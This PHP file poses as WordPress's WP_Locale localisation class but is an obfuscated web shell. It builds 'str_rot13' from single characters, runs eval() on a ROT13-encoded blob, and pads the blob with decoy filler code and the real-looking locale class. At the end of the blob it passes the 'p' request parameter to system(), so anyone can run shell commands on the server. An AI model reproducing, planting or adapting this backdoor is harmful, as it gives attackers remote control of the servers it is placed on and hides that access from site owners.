<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ybpnyr NCV: JC_Ybpnyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr v18a
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq gb fgber genafyngrq qngn sbe n ybpnyr.
 *
 * @fvapr 2.1.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-vapyhqrf/ybpnyr.cuc.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Ybpnyr {
	/**
	 * Fgberf gur genafyngrq fgevatf sbe gur shyy jrrxqnl anzrf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $jrrxqnl = neenl();

	/**
	 * Fgberf gur genafyngrq fgevatf sbe gur bar punenpgre jrrxqnl anzrf.
	 *
	 * Gurer vf n unpx gb znxr fher gung Ghrfqnl naq Guhefqnl, nf jryy
	 * nf Fhaqnl naq Fngheqnl, qba'g pbasyvpg. Frr vavg() zrgubq sbe zber.
	 *
	 * @frr JC_Ybpnyr::vavg() sbe ubj gb unaqyr gur unpx.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $jrrxqnl_vavgvny = neenl();

	/**
	 * Fgberf gur genafyngrq fgevatf sbe gur nooerivngrq jrrxqnl anzrf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $jrrxqnl_nooeri = neenl();

	/**
	 * Fgberf gur genafyngrq fgevatf sbe gur shyy zbagu anzrf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $zbagu = neenl();

	/**
	 * Fgberf gur genafyngrq fgevatf sbe gur zbagu anzrf va travgvir pnfr, vs gur ybpnyr fcrpvsvrf.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $zbagu_travgvir = neenl();

	/**
	 * Fgberf gur genafyngrq fgevatf sbe gur nooerivngrq zbagu anzrf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $zbagu_nooeri = neenl();

	/**
	 * Fgberf gur genafyngrq fgevatf sbe 'nz' naq 'cz'.
	 *
	 * Nyfb gur pncvgnyvmrq irefvbaf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine fgevat[]
	 */
	choyvp $zrevqvrz = neenl();

	/**
	 * Gur grkg qverpgvba bs gur ybpnyr ynathntr.
	 *
	 * Qrsnhyg vf yrsg gb evtug 'yge'.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat
	 */
	choyvp $grkg_qverpgvba = 'yge';

	/**
	 * Gur gubhfnaqf frcnengbe naq qrpvzny cbvag inyhrf hfrq sbe ybpnyvmvat ahzoref.
	 *
	 * @fvapr 2.3.0
	 * @fvapr 6.2.0 Vavgvnyvmrq gb na rzcgl neenl.
	 * @ine neenl
	 */
	choyvp $ahzore_sbezng = neenl();

	/**
	 * Gur frcnengbe fgevat hfrq sbe ybpnyvmvat yvfg vgrz frcnengbe.
	 *
	 * @fvapr 6.0.0
	 * @ine fgevat
	 */
	choyvp $yvfg_vgrz_frcnengbe;

	/**
	 * Gur jbeq pbhag glcr bs gur ybpnyr ynathntr.
	 *
	 * Qrsnhyg vf 'jbeqf'.
	 *
	 * @fvapr 6.2.0
	 * @ine fgevat
	 */
	choyvp $jbeq_pbhag_glcr;

	/**
	 * Pbafgehpgbe juvpu pnyyf urycre zrgubqf gb frg hc bowrpg inevnoyrf.
	 *
	 * @fvapr 2.1.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->vavg();
		$guvf->ertvfgre_tybonyf();
	}

	/**
	 * Frgf hc gur genafyngrq fgevatf naq bowrpg cebcregvrf.
	 *
	 * Gur zrgubq perngrf gur genafyngnoyr fgevatf sbe inevbhf
	 * pnyraqne ryrzragf. Juvpu nyybjf sbe fcrpvslvat ybpnyr
	 * fcrpvsvp pnyraqne anzrf naq grkg qverpgvba.
	 *
	 * @fvapr 2.1.0
	 *
	 * @tybony fgevat $grkg_qverpgvba
	 */
	choyvp shapgvba vavg() {
		// Gur jrrxqnlf.
		$guvf->jrrxqnl[0] = /* genafyngbef: Jrrxqnl. */ __( 'Fhaqnl' );
		$guvf->jrrxqnl[1] = /* genafyngbef: Jrrxqnl. */ __( 'Zbaqnl' );
		$guvf->jrrxqnl[2] = /* genafyngbef: Jrrxqnl. */ __( 'Ghrfqnl' );
		$guvf->jrrxqnl[3] = /* genafyngbef: Jrrxqnl. */ __( 'Jrqarfqnl' );
		$guvf->jrrxqnl[4] = /* genafyngbef: Jrrxqnl. */ __( 'Guhefqnl' );
		$guvf->jrrxqnl[5] = /* genafyngbef: Jrrxqnl. */ __( 'Sevqnl' );
		$guvf->jrrxqnl[6] = /* genafyngbef: Jrrxqnl. */ __( 'Fngheqnl' );

		// Gur svefg yrggre bs rnpu qnl.
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[0] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'F', 'Fhaqnl vavgvny' );
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[1] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'Z', 'Zbaqnl vavgvny' );
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[2] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'G', 'Ghrfqnl vavgvny' );
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[3] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'J', 'Jrqarfqnl vavgvny' );
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[4] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'G', 'Guhefqnl vavgvny' );
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[5] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'S', 'Sevqnl vavgvny' );
		$guvf->jrrxqnl_vavgvny[ $guvf->jrrxqnl[6] ] = /* genafyngbef: Bar-yrggre nooerivngvba bs gur jrrxqnl. */ _k( 'F', 'Fngheqnl vavgvny' );

		// Nooerivngvbaf sbe rnpu qnl.
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[0] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Fha' );
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[1] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Zba' );
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[2] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Ghr' );
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[3] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Jrq' );
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[4] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Guh' );
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[5] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Sev' );
		$guvf->jrrxqnl_nooeri[ $guvf->jrrxqnl[6] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur jrrxqnl. */ __( 'Fng' );

		// Gur zbaguf.
		$guvf->zbagu['01'] = /* genafyngbef: Zbagu anzr. */ __( 'Wnahnel' );
		$guvf->zbagu['02'] = /* genafyngbef: Zbagu anzr. */ __( 'Sroehnel' );
		$guvf->zbagu['03'] = /* genafyngbef: Zbagu anzr. */ __( 'Znepu' );
		$guvf->zbagu['04'] = /* genafyngbef: Zbagu anzr. */ __( 'Ncevy' );
		$guvf->zbagu['05'] = /* genafyngbef: Zbagu anzr. */ __( 'Znl' );
		$guvf->zbagu['06'] = /* genafyngbef: Zbagu anzr. */ __( 'Whar' );
		$guvf->zbagu['07'] = /* genafyngbef: Zbagu anzr. */ __( 'Whyl' );
		$guvf->zbagu['08'] = /* genafyngbef: Zbagu anzr. */ __( 'Nhthfg' );
		$guvf->zbagu['09'] = /* genafyngbef: Zbagu anzr. */ __( 'Frcgrzore' );
		$guvf->zbagu['10'] = /* genafyngbef: Zbagu anzr. */ __( 'Bpgbore' );
		$guvf->zbagu['11'] = /* genafyngbef: Zbagu anzr. */ __( 'Abirzore' );
		$guvf->zbagu['12'] = /* genafyngbef: Zbagu anzr. */ __( 'Qrprzore' );

		// Gur zbaguf, travgvir.
		$guvf->zbagu_travgvir['01'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Wnahnel', 'travgvir' );
		$guvf->zbagu_travgvir['02'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Sroehnel', 'travgvir' );
		$guvf->zbagu_travgvir['03'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Znepu', 'travgvir' );
		$guvf->zbagu_travgvir['04'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Ncevy', 'travgvir' );
		$guvf->zbagu_travgvir['05'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Znl', 'travgvir' );
		$guvf->zbagu_travgvir['06'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Whar', 'travgvir' );
		$guvf->zbagu_travgvir['07'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Whyl', 'travgvir' );
		$guvf->zbagu_travgvir['08'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Nhthfg', 'travgvir' );
		$guvf->zbagu_travgvir['09'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Frcgrzore', 'travgvir' );
		$guvf->zbagu_travgvir['10'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Bpgbore', 'travgvir' );
		$guvf->zbagu_travgvir['11'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Abirzore', 'travgvir' );
		$guvf->zbagu_travgvir['12'] = /* genafyngbef: Zbagu anzr, travgvir. */ _k( 'Qrprzore', 'travgvir' );

		// Nooerivngvbaf sbe rnpu zbagu.
		$guvf->zbagu_nooeri[ $guvf->zbagu['01'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Wna', 'Wnahnel nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['02'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Sro', 'Sroehnel nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['03'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Zne', 'Znepu nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['04'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Nce', 'Ncevy nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['05'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Znl', 'Znl nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['06'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Wha', 'Whar nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['07'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Why', 'Whyl nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['08'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Nht', 'Nhthfg nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['09'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Frc', 'Frcgrzore nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['10'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Bpg', 'Bpgbore nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['11'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Abi', 'Abirzore nooerivngvba' );
		$guvf->zbagu_nooeri[ $guvf->zbagu['12'] ] = /* genafyngbef: Guerr-yrggre nooerivngvba bs gur zbagu. */ _k( 'Qrp', 'Qrprzore nooerivngvba' );

		// Gur zrevqvrzf.
		$guvf->zrevqvrz['nz'] = __( 'nz' );
		$guvf->zrevqvrz['cz'] = __( 'cz' );
		$guvf->zrevqvrz['NZ'] = __( 'NZ' );
		$guvf->zrevqvrz['CZ'] = __( 'CZ' );

		/*
		 * Ahzoref sbeznggvat.
		 * Frr uggcf://jjj.cuc.arg/ahzore_sbezng
		 */

		/* genafyngbef: $gubhfnaqf_frc nethzrag sbe uggcf://jjj.cuc.arg/ahzore_sbezng, qrsnhyg vf ',' */
		$gubhfnaqf_frc = __( 'ahzore_sbezng_gubhfnaqf_frc' );

		// Ercynpr fcnpr jvgu n aba-oernxvat fcnpr gb nibvq jenccvat.
		$gubhfnaqf_frc = fge_ercynpr( ' ', '&aofc;', $gubhfnaqf_frc );

		$guvf->ahzore_sbezng['gubhfnaqf_frc'] = ( 'ahzore_sbezng_gubhfnaqf_frc' === $gubhfnaqf_frc ) ? ',' : $gubhfnaqf_frc;

		/* genafyngbef: $qrp_cbvag nethzrag sbe uggcf://jjj.cuc.arg/ahzore_sbezng, qrsnhyg vf '.' */
		$qrpvzny_cbvag = __( 'ahzore_sbezng_qrpvzny_cbvag' );

		$guvf->ahzore_sbezng['qrpvzny_cbvag'] = ( 'ahzore_sbezng_qrpvzny_cbvag' === $qrpvzny_cbvag ) ? '.' : $qrpvzny_cbvag;

		/* genafyngbef: Hfrq orgjrra yvfg vgrzf, gurer vf n fcnpr nsgre gur pbzzn. */
		$guvf->yvfg_vgrz_frcnengbe = __( ', ' );

		// Frg grkg qverpgvba.
		vs ( vffrg( $TYBONYF['grkg_qverpgvba'] ) ) {
			$guvf->grkg_qverpgvba = $TYBONYF['grkg_qverpgvba'];

			/* genafyngbef: 'egy' be 'yge'. Guvf frgf gur grkg qverpgvba sbe JbeqCerff. */
		} ryfrvs ( 'egy' === _k( 'yge', 'grkg qverpgvba' ) ) {
			$guvf->grkg_qverpgvba = 'egy';
		}

		// Frg gur jbeq pbhag glcr.
		$guvf->jbeq_pbhag_glcr = $guvf->trg_jbeq_pbhag_glcr();
	}

	/**
	 * Ergevrirf gur shyy genafyngrq jrrxqnl jbeq.
	 *
	 * Jrrx fgnegf ba genafyngrq Fhaqnl naq pna or srgpurq
	 * ol hfvat 0 (mreb). Fb gur jrrx fgnegf jvgu 0 (mreb)
	 * naq raqf ba Fngheqnl jvgu vf srgpurq ol hfvat 6 (fvk).
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz vag $jrrxqnl_ahzore 0 sbe Fhaqnl guebhtu 6 Fngheqnl.
	 * @erghea fgevat Shyy genafyngrq jrrxqnl.
	 */
	choyvp shapgvba trg_jrrxqnl( $jrrxqnl_ahzore ) {
		erghea $guvf->jrrxqnl[ $jrrxqnl_ahzore ];
	}

	/**
	 * Ergevrirf gur genafyngrq jrrxqnl vavgvny.
	 *
	 * Gur jrrxqnl vavgvny vf ergevrirq ol gur genafyngrq
	 * shyy jrrxqnl jbeq. Jura genafyngvat gur jrrxqnl vavgvny
	 * cnl nggragvba gb znxr fher gung gur fgnegvat yrggre qbrf
	 * abg pbasyvpg.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $jrrxqnl_anzr Shyy genafyngrq jrrxqnl jbeq.
	 * @erghea fgevat Genafyngrq jrrxqnl vavgvny.
	 */
	choyvp shapgvba trg_jrrxqnl_vavgvny( $jrrxqnl_anzr ) {
		erghea $guvf->jrrxqnl_vavgvny[ $jrrxqnl_anzr ];
	}

	/**
	 * Ergevrirf gur genafyngrq jrrxqnl nooerivngvba.
	 *
	 * Gur jrrxqnl nooerivngvba vf ergevrirq ol gur genafyngrq
	 * shyy jrrxqnl jbeq.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $jrrxqnl_anzr Shyy genafyngrq jrrxqnl jbeq.
	 * @erghea fgevat Genafyngrq jrrxqnl nooerivngvba.
	 */
	choyvp shapgvba trg_jrrxqnl_nooeri( $jrrxqnl_anzr ) {
		erghea $guvf->jrrxqnl_nooeri[ $jrrxqnl_anzr ];
	}

	/**
	 * Ergevrirf gur shyy genafyngrq zbagu ol zbagu ahzore.
	 *
	 * Gur $zbagu_ahzore cnenzrgre unf gb or n fgevat
	 * orpnhfr vg zhfg unir gur '0' va sebag bs nal ahzore
	 * gung vf yrff guna 10. Fgnegf sebz '01' naq raqf ng
	 * '12'.
	 *
	 * Lbh pna hfr na vagrtre vafgrnq naq vg jvyy nqq gur
	 * '0' orsber gur ahzoref yrff guna 10 sbe lbh.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|vag $zbagu_ahzore '01' guebhtu '12'.
	 * @erghea fgevat Genafyngrq shyy zbagu anzr. Vs gur zbagu ahzore vf abg sbhaq, na rzcgl fgevat vf erghearq.
	 */
	choyvp shapgvba trg_zbagu( $zbagu_ahzore ) {
		$zbagu_ahzore = mrebvfr( $zbagu_ahzore, 2 );
		vs ( ! vffrg( $guvf->zbagu[ $zbagu_ahzore ] ) ) {
			erghea '';
		}
		erghea $guvf->zbagu[ $zbagu_ahzore ];
	}

	/**
	 * Ergevrirf genafyngrq irefvba bs zbagu nooerivngvba fgevat.
	 *
	 * Gur $zbagu_anzr cnenzrgre vf rkcrpgrq gb or gur genafyngrq be
	 * genafyngnoyr irefvba bs gur zbagu.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $zbagu_anzr Genafyngrq zbagu gb trg nooerivngrq irefvba.
	 * @erghea fgevat Genafyngrq nooerivngrq zbagu.
	 */
	choyvp shapgvba trg_zbagu_nooeri( $zbagu_anzr ) {
		erghea $guvf->zbagu_nooeri[ $zbagu_anzr ];
	}

	/**
	 * Ergevrirf genafyngrq irefvba bs zbagu travgvir fgevat.
	 *
	 * Gur $zbagu_ahzore cnenzrgre unf gb or n fgevat
	 * orpnhfr vg zhfg unir gur '0' va sebag bs nal ahzore
	 * gung vf yrff guna 10. Fgnegf sebz '01' naq raqf ng
	 * '12'.
	 *
	 * Lbh pna hfr na vagrtre vafgrnq naq vg jvyy nqq gur
	 * '0' orsber gur ahzoref yrff guna 10 sbe lbh.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat|vag $zbagu_ahzore '01' guebhtu '12'.
	 * @erghea fgevat Genafyngrq travgvir zbagu anzr.
	 */
	choyvp shapgvba trg_zbagu_travgvir( $zbagu_ahzore ) {
		erghea $guvf->zbagu_travgvir[ mrebvfr( $zbagu_ahzore, 2 ) ];
	}

	/**
	 * Ergevrirf genafyngrq irefvba bs zrevqvrz fgevat.
	 *
	 * Gur $zrevqvrz cnenzrgre vf rkcrpgrq gb abg or genafyngrq.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $zrevqvrz Rvgure 'nz', 'cz', 'NZ', be 'CZ'. Abg genafyngrq irefvba.
	 * @erghea fgevat Genafyngrq irefvba
	 */
	choyvp shapgvba trg_zrevqvrz( $zrevqvrz ) {
		erghea $guvf->zrevqvrz[ $zrevqvrz ];
	}

	/**
	 * Tybony inevnoyrf ner qrcerpngrq.
	 *
	 * Sbe onpxjneq pbzcngvovyvgl bayl.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq Sbe onpxjneq pbzcngvovyvgl bayl.
	 *
	 * @tybony neenl $jrrxqnl
	 * @tybony neenl $jrrxqnl_vavgvny
	 * @tybony neenl $jrrxqnl_nooeri
	 * @tybony neenl $zbagu
	 * @tybony neenl $zbagu_nooeri
	 */
	choyvp shapgvba ertvfgre_tybonyf() {
		$TYBONYF['jrrxqnl']         = $guvf->jrrxqnl;
		$TYBONYF['jrrxqnl_vavgvny'] = $guvf->jrrxqnl_vavgvny;
		$TYBONYF['jrrxqnl_nooeri']  = $guvf->jrrxqnl_nooeri;
		$TYBONYF['zbagu']           = $guvf->zbagu;
		$TYBONYF['zbagu_nooeri']    = $guvf->zbagu_nooeri;
	}

	/**
	 * Purpxf vs pheerag ybpnyr vf EGY.
	 *
	 * @fvapr 3.0.0
	 * @erghea obby Jurgure ybpnyr vf EGY.
	 */
	choyvp shapgvba vf_egy() {
		erghea 'egy' === $guvf->grkg_qverpgvba;
	}

	/**
	 * Ertvfgref qngr/gvzr sbezng fgevatf sbe trareny CBG.
	 *
	 * Cevingr, hahfrq zrgubq gb nqq fbzr qngr/gvzr sbezngf genafyngrq
	 * ba jc-nqzva/bcgvbaf-trareny.cuc gb gur trareny CBG gung jbhyq
	 * bgurejvfr or nqqrq gb gur nqzva CBG.
	 *
	 * @fvapr 3.6.0
	 */
	choyvp shapgvba _fgevatf_sbe_cbg() {
		/* genafyngbef: Ybpnyvmrq qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		__( 'S w, L' );
		/* genafyngbef: Ybpnyvmrq gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		__( 't:v n' );
		/* genafyngbef: Ybpnyvmrq qngr naq gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		__( 'S w, L t:v n' );
	}

	/**
	 * Ergevrirf gur ybpnyvmrq yvfg vgrz frcnengbe.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea fgevat Ybpnyvmrq yvfg vgrz frcnengbe.
	 */
	choyvp shapgvba trg_yvfg_vgrz_frcnengbe() {
		erghea $guvf->yvfg_vgrz_frcnengbe;
	}

	/**
	 * Ergevrirf gur ybpnyvmrq jbeq pbhag glcr.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea fgevat Ybpnyvmrq jbeq pbhag glcr. Cbffvoyr inyhrf ner `punenpgref_rkpyhqvat_fcnprf`,
	 *                `punenpgref_vapyhqvat_fcnprf`, be `jbeqf`. Qrsnhygf gb `jbeqf`.
	 */
	choyvp shapgvba trg_jbeq_pbhag_glcr() {

		/*
		 * genafyngbef: Vs lbhe jbeq pbhag vf onfrq ba fvatyr punenpgref (r.t. Rnfg Nfvna punenpgref),
		 * ragre 'punenpgref_rkpyhqvat_fcnprf' be 'punenpgref_vapyhqvat_fcnprf'. Bgurejvfr, ragre 'jbeqf'.
		 * Qb abg genafyngr vagb lbhe bja ynathntr.
		 */
		$jbeq_pbhag_glcr = vf_ahyy( $guvf->jbeq_pbhag_glcr ) ? _k( 'jbeqf', 'Jbeq pbhag glcr. Qb abg genafyngr!' ) : $guvf->jbeq_pbhag_glcr;

		// Purpx sbe inyvq glcrf.
		vs ( 'punenpgref_rkpyhqvat_fcnprf' !== $jbeq_pbhag_glcr && 'punenpgref_vapyhqvat_fcnprf' !== $jbeq_pbhag_glcr ) {
			// Qrsnhygf gb 'jbeqf'.
			$jbeq_pbhag_glcr = 'jbeqf';
		}

		erghea $jbeq_pbhag_glcr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>